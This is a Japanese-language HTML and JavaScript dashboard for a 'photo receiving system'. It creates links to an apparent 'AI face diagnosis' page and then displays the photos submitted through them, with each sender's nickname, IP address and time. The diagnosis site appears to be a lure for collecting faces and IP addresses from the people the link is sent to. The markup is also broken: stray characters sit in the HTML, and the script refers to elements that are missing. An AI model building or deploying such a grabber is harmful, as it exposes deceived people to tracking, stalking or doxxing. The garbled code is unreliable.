<style>

<body>


<div class="container">


<h1>📷 写真受信システム</h1>


<p class="description">

リンクを作成して相手に送信すると、<br>

相手が同意して撮影・送信した写真を<br>

このページから確認できます。

</p>


<button
  id="createButton"
>
🔗 リンクを作成
</button>


<div
  id="linkArea"
  class="hidden"
>


<div class="infoBox">

>

<div class="infoTitle">
診断用リンク
</div>

  class="linkText"

-
</div>


<button

>

</button>


<div
  id="status"
  class="status"
>
</div>


</div>


<div
  id="photosArea"
  class="photosArea"
>


</div>


<div class="warning">

⚠️ このページで表示されるIPアドレスは、
写真送信時の接続元IPです。

IPアドレスだけで自宅住所や本名が
分かるものではありません。

写真・ニックネーム・IPアドレスなどは
必要な範囲で適切に管理してください。

</div>


</div>


<script>


/*
========================================
設定
========================================
*/


const PHOTO_RECEIVER_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";


const DIAGNOSIS_URL =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


const STORAGE_KEY =
  "receiverRoom";


/*
========================================
HTMLエスケープ
========================================
*/

function escapeHtml(value) {

  return String(
    value ?? ""
  )

    .replace(
      /&/g,
      "&amp;"
    )

    .replace(
      /</g,
      "&lt;"
    )

    .replace(
      />/g,
      "&gt;"
    )

    .replace(
      /"/g,
      "&quot;"
    )

    .replace(
      /'/g,
      "&#039;"
    );

}


/*
========================================
ランダムRoom ID
========================================
*/

function createRoomId() {

  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";


  let result = "";


  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      chars[
        Math.floor(
          Math.random() *
          chars.length
        )
      ];

  }


  return result;

}


/*
========================================
要素
========================================
*/

const createButton =
  document.getElementById(
    "createButton"
  );


const linkArea =
  document.getElementById(
    "linkArea"
  );


const roomDisplay =
  document.getElementById(
    "roomDisplay"
  );


const linkDisplay =
  document.getElementById(
    "linkDisplay"
  );


const copyButton =
  document.getElementById(
    "copyButton"
  );


const openButton =
  document.getElementById(
    "openButton"
  );


const checkButton =
  document.getElementById(
    "checkButton"
  );


const status =
  document.getElementById(
    "status"
  );


const photosArea =
  document.getElementById(
    "photosArea"
  );


/*
========================================
現在のRoom
========================================
*/

let currentRoom = "";


/*
========================================
Roomを表示
========================================
*/

function showRoom(room) {

  currentRoom =
    room;


  const diagnosisUrl =
    DIAGNOSIS_URL +
    "?room=" +
    encodeURIComponent(
      room
    );


  roomDisplay.textContent =
    room;


  linkDisplay.textContent =
    diagnosisUrl;


  linkArea.classList.remove(
    "hidden"
  );


  photosArea.innerHTML =
    "";


  status.textContent =
    "";

}


/*
========================================
リンク作成
========================================
*/

createButton.addEventListener(
  "click",
  () => {

    const room =
      createRoomId();


    localStorage.setItem(
      STORAGE_KEY,
      room
    );


    showRoom(
      room
    );

  }
);


/*
========================================
リンクコピー
========================================
*/

copyButton.addEventListener(
  "click",
  async () => {

    if (!currentRoom) {

      return;

    }


    const diagnosisUrl =
      DIAGNOSIS_URL +
      "?room=" +
      encodeURIComponent(
        currentRoom
      );


    try {

      await navigator.clipboard.writeText(
        diagnosisUrl
      );


      copyButton.textContent =
        "✅ コピーしました！";


      setTimeout(
        () => {

          copyButton.textContent =
            "📋 リンクをコピー";

        },
        1800
      );


    } catch (error) {

      console.error(
        error
      );


      alert(
        "コピーできませんでした。\n\n" +
        diagnosisUrl
      );

    }

  }
);


/*
========================================
診断サイトを開く
========================================
*/

openButton.addEventListener(
  "click",
  () => {

    if (!currentRoom) {

      return;

    }


    const diagnosisUrl =
      DIAGNOSIS_URL +
      "?room=" +
      encodeURIComponent(
        currentRoom
      );


    window.open(
      diagnosisUrl,
      "_blank"
    );

  }
);


/*
========================================
写真確認
========================================
*/

checkButton.addEventListener(
  "click",
  async () => {

    if (!currentRoom) {

      alert(
        "先にリンクを作成してください。"
      );

      return;

    }


    checkButton.disabled =
      true;


    checkButton.textContent =
      "📷 写真を確認中...";


    status.textContent =
      "写真情報を取得しています...";


    photosArea.innerHTML =
      "";


    try {

      const url =
        PHOTO_RECEIVER_URL +
        "?room=" +
        encodeURIComponent(
          currentRoom
        );


      const response =
        await fetch(
          url,
          {
            method:
              "GET"
          }
        );


      const data =
        await response.json();


      if (!response.ok) {

        throw new Error(
          data.error ||
          "写真情報の取得に失敗しました。"
        );

      }


      if (
        !data.success
      ) {

        throw new Error(
          data.error ||
          "写真情報を取得できませんでした。"
        );

      }


      const photos =
        data.photos ||
        [];


      status.textContent =
        photos.length +
        "件の写真があります。";


      /*
      --------------------------------
      写真なし
      --------------------------------
      */

      if (
        photos.length === 0
      ) {

        photosArea.innerHTML = `
          <div class="empty">
            📭 まだ写真はありません。
          </div>
        `;


        return;

      }


      /*
      --------------------------------
      写真表示
      --------------------------------
      */

      photos.forEach(
        (
          photo,
          index
        ) => {


          const card =
            document.createElement(
              "div"
            );


          card.className =
            "photoCard";


          const nickname =
            escapeHtml(
              photo.nickname ||
              "名前なし"
            );


          const ip =
            escapeHtml(
              photo.ip ||
              "記録なし"
            );


          let dateText =
            "記録なし";


          if (
            photo.created_at
          ) {

            const date =
              new Date(
                photo.created_at
              );


            if (
              !Number.isNaN(
                date.getTime()
              )
            ) {

              dateText =
                date.toLocaleString(
                  "ja-JP"
                );

            }

          }


          dateText =
            escapeHtml(
              dateText
            );


          const imageUrl =
            escapeHtml(
              photo.url ||
              ""
            );


          card.innerHTML = `

            <h3>
              📷 写真 ${index + 1}
            </h3>


            <div class="photoInfo">

              <div>
                👤
                <strong>
                  ${nickname}
                </strong>
                さん
              </div>


              <div>
                🌐 IP:
                <strong>
                  ${ip}
                </strong>
              </div>


              <div>
                🕐 送信日時:
                <strong>
                  ${dateText}
                </strong>
              </div>

            </div>


            <img
              src="${imageUrl}"
              alt="受信した写真"
            >

          `;


          photosArea.appendChild(
            card
          );

        }
      );


    } catch (error) {

      console.error(
        "写真確認エラー:",
        error
      );


      status.textContent =
        "";


      photosArea.innerHTML = `

        <div class="empty">

          ❌ 写真情報を取得できませんでした。

          <br><br>

          ${escapeHtml(
            error.message
          )}

        </div>

      `;


    } finally {

      checkButton.disabled =
        false;


      checkButton.textContent =
        "📷 写真を確認";

    }

  }
);


/*
========================================
前回のRoomを復元
========================================
*/

const savedRoom =
  localStorage.getItem(
    STORAGE_KEY
  );


if (
  savedRoom
) {

  showRoom(
    savedRoom
  );

}


</script>


</body>

</html>
